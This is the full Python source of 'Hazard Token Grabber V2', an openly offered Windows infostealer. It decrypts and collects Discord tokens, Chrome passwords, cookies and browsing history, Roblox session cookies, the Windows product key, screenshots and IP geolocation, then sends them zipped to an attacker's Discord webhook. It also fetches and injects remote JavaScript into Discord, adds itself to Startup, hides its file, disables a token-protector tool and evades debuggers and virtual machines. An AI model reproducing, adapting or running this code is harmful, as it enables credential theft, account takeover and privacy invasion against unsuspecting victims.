import os
import re
import json
import httpx
import ntpath
import random
import winreg
import ctypes
import shutil
import psutil
import asyncio
import sqlite3
import zipfile
import threading
import subprocess

from sys import argv
from PIL import ImageGrab
from base64 import b64encode, b64decode
from Crypto.Cipher import AES
from tempfile import mkdtemp, gettempdir
from win32crypt import CryptUnprotectData
from datetime import datetime, timezone, timedelta

__author__ = "Rdimo"
__version__ = '1.8.6'
__license__ = "GPL-3.0"
__config__ = {
    # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
    # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
    'webhook': "WEBHOOK_HERE",
    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
    'webhook_protector_key': "KEY_HERE",
    # keep it as it is unless you want to have a custom one
    'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
    # if True, it will ping @everyone when someone ran Hazard v2
    'ping_on_run': False,
    # set to False if you don't want it to kill programs such as discord upon running the exe
    'kill_processes': True,
    # if you want the file to run at startup
    'startup': True,
    # if you want the file to hide itself after run
    'hide_self': True,
    # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
    'anti_debug': True,
    # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
    'blackListedPrograms':
    [
        "httpdebuggerui",
        "wireshark",
        "fiddler",
        "regedit",
        "cmd",
        "taskmgr",
        "vboxservice",
        "df5serv",
        "processhacker",
        "vboxtray",
        "vmtoolsd",
        "vmwaretray",
        "ida64",
        "ollydbg",
        "pestudio",
        "vmwareuser",
        "vgauthservice",
        "vmacthlp",
        "x96dbg",
        "vmsrvc",
        "x32dbg",
        "vmusrvc",
        "prl_cc",
        "prl_tools",
        "xenservice",
        "qemu-ga",
        "joeboxcontrol",
        "ksdumperclient",
        "ksdumper",
        "joeboxserver"
    ]

}
# global variables
Victim = os.getlogin()
Victim_pc = os.getenv("COMPUTERNAME")
ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]


class Functions(object):
    @staticmethod
    def get_master_key(path) -> str:
        if not ntpath.exists(path):
            return None
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        try:
            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
            return Functions.win_decrypt(master_key[5:])
        except KeyError:
            return None

    @staticmethod
    def convert_time(time):
        try:
            epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
            codestamp = epoch + timedelta(microseconds=time)
            return codestamp
        except Exception:
            pass

    @staticmethod
    def win_decrypt(encrypted_str: bytes) -> str:
        return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]

    @staticmethod
    def create_temp_file(_dir: str or os.PathLike = gettempdir()):
        file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
        path = ntpath.join(_dir, file_name)
        open(path, "x")
        return path

    @staticmethod
    def decrypt_val(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return f'Failed to decrypt "{str(buff)}" | key: "{str(master_key)}"'

    @staticmethod
    def get_headers(token: str = None):
        headers = {
            "Content-Type": "application/json",
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    @staticmethod
    def system_info() -> list:
        flag = 0x08000000
        sh1 = "powershell -encodedCommand dwBtAGkAYwAgAGMAcwBwAHIAbwBkAHUAYwB0ACAAZwBlAHQAIAB1AHUAaQBkAA=="
        sh2 = "powershell -encodedCommand RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQBWAGEAbAB1AGUAIAAtAFAAYQB0AGgAIAAnAEgASwBMAE0AOgBTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABOAFQAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABTAG8AZgB0AHcAYQByAGUAUAByAG8AdABlAGMAdABpAG8AbgBQAGwAYQB0AGYAbwByAG0AJwAgAC0ATgBhAG0AZQAgAEIAYQBjAGsAdQBwAFAAcgBvAGQAdQBjAHQASwBlAHkARABlAGYAYQB1AGwAdAA="
        sh3 = "powershell -encodedCommand RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQBWAGEAbAB1AGUAIAAtAFAAYQB0AGgAIAAnAEgASwBMAE0AOgBTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABOAFQAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AJwAgAC0ATgBhAG0AZQAgAFAAcgBvAGQAdQBjAHQATgBhAG0AZQA="
        try:
            HWID = subprocess.check_output(sh1, creationflags=flag).decode().split('\n')[1].strip()
        except Exception:
            HWID = "N/A"
        try:
            wkey = subprocess.check_output(sh2, creationflags=flag).decode().rstrip()
        except Exception:
            wkey = "N/A"
        try:
            winver = subprocess.check_output(sh3, creationflags=flag).decode().rstrip()
        except Exception:
            winver = "N/A"
        return [HWID, winver, wkey]

    @staticmethod
    def network_info() -> list:
        ip, city, country, region, org, loc, googlemap = "None", "None", "None", "None", "None", "None", "None"
        req = httpx.get("https://ipinfo.io/json")
        if req.status_code == 200:
            data = req.json()
            ip = data.get('ip')
            city = data.get('city')
            country = data.get('country')
            region = data.get('region')
            org = data.get('org')
            loc = data.get('loc')
            googlemap = "https://www.google.com/maps/search/google+map++" + loc
        return [ip, city, country, region, org, loc, googlemap]

    @staticmethod
    def fetch_conf(e: str) -> str or bool | None:
        return __config__.get(e)

    @staticmethod
    def powershell_encode(a: str):
        return "powershell -encodedCommand " + b64encode(a.encode("utf-16-le")).decode()


class HazardTokenGrabberV2(Functions):
    def __init__(self):
        self.webhook = self.fetch_conf('webhook')
        self.discordApi = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.chrome = ntpath.join(self.appdata, 'Google', 'Chrome', 'User Data')
        self.dir, self.temp = mkdtemp(), gettempdir()
        inf, net = self.system_info(), self.network_info()
        self.hwid, self.winver, self.winkey = inf[0], inf[1], inf[2]
        self.ip, self.city, self.country, self.region, self.org, self.loc, self.googlemap = net[0], net[1], net[2], net[3], net[4], net[5], net[6]
        self.startup_loc = ntpath.join(self.roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

        self.hook_reg = "api/webhooks"
        self.chrome_reg = re.compile(r'^(profile\s\d*)|(default)|(guest profile)$', re.IGNORECASE | re.MULTILINE)
        self.regex = r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"

        self.sep = os.sep
        self.tokens = []
        self.robloxcookies = []
        self.chrome_key = self.get_master_key(ntpath.join(self.chrome, "Local State"))

        os.makedirs(self.dir, exist_ok=True)

    def try_extract(func):
        '''Decorator to safely catch and ignore exceptions'''
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass
        return wrapper

    async def checkToken(self, tkn: str) -> str:
        try:
            r = httpx.get(
                url=self.discordApi,
                headers=self.get_headers(tkn),
                timeout=5.0
            )
        except (httpx._exceptions.ConnectTimeout, httpx._exceptions.TimeoutException):
            pass
        if r.status_code == 200 and tkn not in self.tokens:
            self.tokens.append(tkn)

    async def init(self):
        if self.webhook == "" or self.webhook == "\x57EBHOOK_HERE":
            os._exit(0)
        if self.fetch_conf('anti_debug') and AntiDebug().inVM:
            os._exit(0)
        await self.bypassBetterDiscord()
        await self.bypassTokenProtector()
        function_list = [self.screenshot, self.sys_dump, self.grab_tokens, self.grabRobloxCookie]
        if self.fetch_conf('hide_self'):
            function_list.append(self.hide)

        if self.fetch_conf('kill_processes'):
            await self.killProcesses()

        if self.fetch_conf('startup'):
            function_list.append(self.startup)

        if ntpath.exists(self.chrome) and self.chrome_key is not None:
            function_list.extend([self.grabPassword, self.grabCookies, self.grabHistory])

        for func in function_list:
            process = threading.Thread(target=func, daemon=True)
            process.start()
        for t in threading.enumerate():
            try:
                t.join()
            except RuntimeError:
                continue
        self.neatifyTokens()
        await self.injector()
        self.finish()

    def hide(self):
        ctypes.windll.kernel32.SetFileAttributesW(argv[0], 2)

    def startup(self):
        try:
            shutil.copy2(argv[0], self.startup_loc)
        except Exception:
            pass

    async def injector(self):
        for _dir in os.listdir(self.appdata):
            if 'discord' in _dir.lower():
                discord = self.appdata + os.sep + _dir
                for __dir in os.listdir(ntpath.abspath(discord)):
                    if re.match(r'app.+', __dir):
                        app = ntpath.abspath(ntpath.join(discord, __dir))
                        modules = ntpath.join(app, 'modules')
                        if not ntpath.exists(modules):
                            return
                        for ___dir in os.listdir(modules):
                            if re.match(r"discord_desktop_core-\d+", ___dir):
                                inj_path = modules + os.sep + ___dir + f'\\discord_desktop_core\\'
                                if ntpath.exists(inj_path):
                                    if self.startup_loc not in argv[0]:
                                        try:
                                            os.makedirs(inj_path + 'initiation', exist_ok=True)
                                        except PermissionError:
                                            pass
                                    if self.hook_reg in self.webhook:
                                        f = httpx.get(self.fetch_conf('injection_url')).text.replace("%WEBHOOK%", self.webhook)
                                    else:
                                        f = httpx.get(
                                            self.fetch_conf('injection_url')).text.replace(
                                            "%WEBHOOK%", self.webhook).replace(
                                            "%WEBHOOK_KEY%", self.fetch_conf('webhook_protector_key'))
                                    try:
                                        with open(inj_path + 'index.js', 'w', errors="ignore") as indexFile:
                                            indexFile.write(f)
                                    except PermissionError:
                                        pass
                                    if self.fetch_conf('kill_processes'):
                                        os.startfile(app + self.sep + _dir + '.exe')

    async def killProcesses(self):
        blackListedPrograms = self.fetch_conf('blackListedPrograms')
        for i in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:
            blackListedPrograms.append(i)
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in blackListedPrograms):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

    async def bypassTokenProtector(self):
        # fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
        tp = f"{self.roaming}\\DiscordTokenProtector\\"
        if not ntpath.exists(tp):
            return
        config = tp + "config.json"

        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(tp + i)
            except FileNotFoundError:
                pass
        if ntpath.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['Rdimo_just_shit_on_this_token_protector'] = "https://github.com/Rdimo"
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)
            with open(config, 'a') as f:
                f.write("\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")

    async def bypassBetterDiscord(self):
        bd = self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
        if ntpath.exists(bd):
            x = self.hook_reg
            with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                txt = f.read()
                content = txt.replace(x, 'RdimoTheGoat')
            with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                f.write(content)

    @try_extract
    def grab_tokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.chrome + '\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not ntpath.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if ntpath.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                asyncio.run(self.checkToken(token))
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            asyncio.run(self.checkToken(token))

        if ntpath.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            asyncio.run(self.checkToken(token))

    @try_extract
    def grabPassword(self):
        f = open(self.dir + '\\Google Passwords.txt', 'w', encoding="cp437", errors='ignore')
        for prof in os.listdir(self.chrome):
            if re.match(self.chrome_reg, prof):
                login_db = ntpath.join(self.chrome, prof, 'Login Data')
                login = self.create_temp_file()

                shutil.copy2(login_db, login)
                conn = sqlite3.connect(login)
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")

                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = self.decrypt_val(encrypted_password, self.chrome_key)
                    if url != "":
                        f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")

                cursor.close()
                conn.close()
                os.remove(login)
        f.close()

    @try_extract
    def grabCookies(self):
        f = open(self.dir + '\\Google Cookies.txt', 'w', encoding="cp437", errors='ignore')
        for prof in os.listdir(self.chrome):
            if re.match(self.chrome_reg, prof):
                login_db = ntpath.join(self.chrome, prof, 'Network', 'cookies')
                login = self.create_temp_file()

                shutil.copy2(login_db, login)
                conn = sqlite3.connect(login)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value from cookies")

                for r in cursor.fetchall():
                    host = r[0]
                    user = r[1]
                    decrypted_cookie = self.decrypt_val(r[2], self.chrome_key)
                    if host != "":
                        f.write(f"HOST KEY: {host} | NAME: {user} | VALUE: {decrypted_cookie}\n")
                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
                        self.robloxcookies.append(decrypted_cookie)

                cursor.close()
                conn.close()
                os.remove(login)
        f.close()

    @try_extract
    def grabHistory(self):
        f = open(self.dir + '\\Google History.txt', 'w', encoding="cp437", errors='ignore')

        def extract_search_history(db_cursor):
            db_cursor.execute('SELECT term FROM keyword_search_terms')
            search_terms = ""
            for item in db_cursor.fetchall():
                if item[0] != "":
                    search_terms += f"{item[0]}\n"
            return search_terms

        def extract_web_history(db_cursor):
            web = ""
            db_cursor.execute('SELECT title, url, last_visit_time FROM urls')
            for item in db_cursor.fetchall():
                web += f"Title: {item[0]}\nUrl: {item[1]}\nLast Time Visit: {self.convert_time(item[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"
            return web

        for prof in os.listdir(self.chrome):
            if re.match(self.chrome_reg, prof):
                login_db = ntpath.join(self.chrome, prof, 'History')
                login = self.create_temp_file()

                shutil.copy2(login_db, login)
                conn = sqlite3.connect(login)
                cursor = conn.cursor()

                search_history = extract_search_history(cursor)
                web_history = extract_web_history(cursor)

                f.write(f"{' '*17}Search History\n{'-'*50}\n{search_history}\n{' '*17}\n\nWeb History\n{'-'*50}\n{web_history}")

                cursor.close()
                conn.close()
                os.remove(login)
        f.close()

    def neatifyTokens(self):
        f = open(self.dir + "\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
        for token in self.tokens:
            j = httpx.get(self.discordApi, headers=self.get_headers(token)).json()
            user = j.get('username') + '#' + str(j.get("discriminator"))

            badges = ""
            flags = j['flags']
            if (flags == 1):
                badges += "Staff, "
            if (flags == 2):
                badges += "Partner, "
            if (flags == 4):
                badges += "Hypesquad Event, "
            if (flags == 8):
                badges += "Green Bughunter, "
            if (flags == 64):
                badges += "Hypesquad Bravery, "
            if (flags == 128):
                badges += "HypeSquad Brillance, "
            if (flags == 256):
                badges += "HypeSquad Balance, "
            if (flags == 512):
                badges += "Early Supporter, "
            if (flags == 16384):
                badges += "Gold BugHunter, "
            if (flags == 131072):
                badges += "Verified Bot Developer, "
            if (badges == ""):
                badges = "None"

            email = j.get("email")
            phone = j.get("phone") if j.get("phone") else "No Phone Number attached"
            nitro_data = httpx.get(self.discordApi + '/billing/subscriptions', headers=self.get_headers(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(json.loads(httpx.get(self.discordApi + "/billing/payment-sources", headers=self.get_headers(token)).text)) > 0)
            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
        f.close()

    def grabRobloxCookie(self):
        def subproc(path):
            try:
                return subprocess.check_output(
                    self.powershell_encode(fr"Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY"),
                    creationflags=0x08000000).decode().rstrip()
            except Exception:
                return None
        reg_cookie = subproc(r'HKLM')
        if not reg_cookie:
            reg_cookie = subproc(r'HKCU')
        if reg_cookie:
            self.robloxcookies.append(reg_cookie)
        if self.robloxcookies:
            with open(self.dir + "\\Roblox Cookies.txt", "w") as f:
                for i in self.robloxcookies:
                    f.write(i + '\n')

    def screenshot(self):
        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        image.save(self.dir + "\\Screenshot.png")
        image.close()

    def sys_dump(self):
        line_sep = "=" * 50
        about = f"""
{line_sep}
{Victim} | {Victim_pc}
{line_sep}
Windows key: {self.winkey}
Windows version: {self.winver}
{line_sep}
RAM: {ram}GB
DISK: {disk}GB
HWID: {self.hwid}
{line_sep}
IP: {self.ip}
City: {self.city}
Country: {self.country}
Region: {self.region}
Org: {self.org}
GoogleMaps: {self.googlemap}
{line_sep}
        """
        with open(self.dir + "\\System info.txt", "w", encoding="utf-8", errors='ignore') as f:
            f.write(about)

    def finish(self):
        for i in os.listdir(self.dir):
            if i.endswith('.txt'):
                path = self.dir + self.sep + i
                with open(path, "r", errors="ignore") as ff:
                    x = ff.read()
                    if not x:
                        ff.close()
                        os.remove(path)
                    else:
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write("🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                            fp.write(x + "\n\n🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2")

        _zipfile = ntpath.join(self.appdata, f'Hazard.V2-[{Victim}].zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = ntpath.abspath(self.dir)
        for dirname, _, files in os.walk(self.dir):
            for filename in files:
                absname = ntpath.abspath(ntpath.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()

        files_found = ''
        for f in os.listdir(self.dir):
            files_found += f"・{f}\n"
        tokens = ''
        for tkn in self.tokens:
            tokens += f'{tkn}\n\n'
        fileCount = f"{len(files)} Files Found: "

        embed = {
            'avatar_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif',
            'embeds': [
                {
                    'author': {
                        'name': f'*{Victim}* Just ran Hazard Token Grabber.V2',
                        'url': 'https://github.com/Rdimo/Hazard-Token-Grabber-V2',
                        'icon_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif'
                    },
                    'color': 176185,
                    'description': f'[Google Maps Location]({self.googlemap})',
                    'fields': [
                        {
                            'name': '\u200b',
                            'value': f'''```fix
                                IP:᠎ {self.ip.replace(" ", "᠎ ") if self.ip else "N/A"}
                                Org:᠎ {self.org.replace(" ", "᠎ ") if self.org else "N/A"}
                                City:᠎ {self.city.replace(" ", "᠎ ") if self.city else "N/A"}
                                Region:᠎ {self.region.replace(" ", "᠎ ") if self.region else "N/A"}
                                Country:᠎ {self.country.replace(" ", "᠎ ") if self.country else "N/A"}```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': '\u200b',
                            'value': f'''```fix
                                PCName: {Victim_pc.replace(" ", "᠎ ")}
                                WinKey:᠎ {self.winkey.replace(" ", "᠎ ")}
                                WinVer:᠎ {self.winver.replace(" ", "᠎ ")}
                                DiskSpace:᠎ {disk}GB
                                Ram:᠎ {ram}GB```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': '**Tokens:**',
                            'value': f'''```yaml
                                {tokens if tokens else "No tokens extracted"}```
                            '''.replace(' ', ''),
                            'inline': False
                        },
                        {
                            'name': fileCount,
                            'value': f'''```ini
                                [
                                {files_found.strip()}
                                ]```
                            '''.replace(' ', ''),
                            'inline': False
                        }
                    ],
                    'footer': {
                        'text': '🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2'
                    }
                }
            ]
        }
        if self.fetch_conf('ping_on_run'):
            embed.update({'content': '@everyone'})

        with open(_zipfile, 'rb') as f:
            if self.hook_reg in self.webhook:
                httpx.post(self.webhook, json=embed)
                httpx.post(self.webhook, files={'upload_file': f})
            else:
                from pyotp import TOTP
                key = TOTP(self.fetch_conf('webhook_protector_key')).now()
                httpx.post(self.webhook, headers={"Authorization": key}, json=embed)
                httpx.post(self.webhook, headers={"Authorization": key}, files={'upload_file': f})
        os.remove(_zipfile)
        shutil.rmtree(self.dir, ignore_errors=True)


class AntiDebug(Functions):
    inVM = False

    def __init__(self):
        self.processes = list()

        self.blackListedUsers = [
            "WDAGUtilityAccount", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq",
            "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl",
        ]
        self.blackListedPCNames = [
            "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM",
            "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4",
            "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH",
        ]
        self.blackListedHWIDS = [
            "7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009",
            "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
            "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "79AF5279-16CF-4094-9758-F88A616D81B4",
            "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022",
            "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65", "B1112042-52E8-E25B-3655-6A4F54155DBF",
            "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C",
            "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
            "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
            "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
        ]

        for func in [self.listCheck, self.registryCheck, self.specsCheck]:
            process = threading.Thread(target=func, daemon=True)
            self.processes.append(process)
            process.start()
        for t in self.processes:
            try:
                t.join()
            except RuntimeError:
                continue

    def programExit(self):
        self.__class__.inVM = True

    def listCheck(self):
        for path in [r'D:\Tools', r'D:\OS2', r'D:\NT3X']:
            if ntpath.exists(path):
                self.programExit()

        for user in self.blackListedUsers:
            if Victim == user:
                self.programExit()

        for pcName in self.blackListedPCNames:
            if Victim_pc == pcName:
                self.programExit()

        for hwid in self.blackListedHWIDS:
            if self.system_info()[0] == hwid:
                self.programExit()

    def specsCheck(self):
        # would not recommend changing this to over 2gb since some actually have 3gb of ram
        if int(ram) <= 2:  # 2gb or less ram
            self.programExit()
        if int(disk) <= 50:  # 50gb or less disc space
            self.programExit()
        if int(psutil.cpu_count()) <= 1:  # 1 or less cpu cores
            self.programExit()

    def registryCheck(self):
        reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
        if (reg1 and reg2) != 1:
            self.programExit()

        handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
        try:
            reg_val = winreg.QueryValueEx(handle, '0')[0]
            if ("VMware" or "VBOX") in reg_val:
                self.programExit()
        finally:
            winreg.CloseKey(handle)


if __name__ == "__main__" and os.name == "nt":
    try:
        httpx.get('https://google.com')
    except httpx.ConnectTimeout:
        os._exit(0)
    asyncio.run(HazardTokenGrabberV2().init())
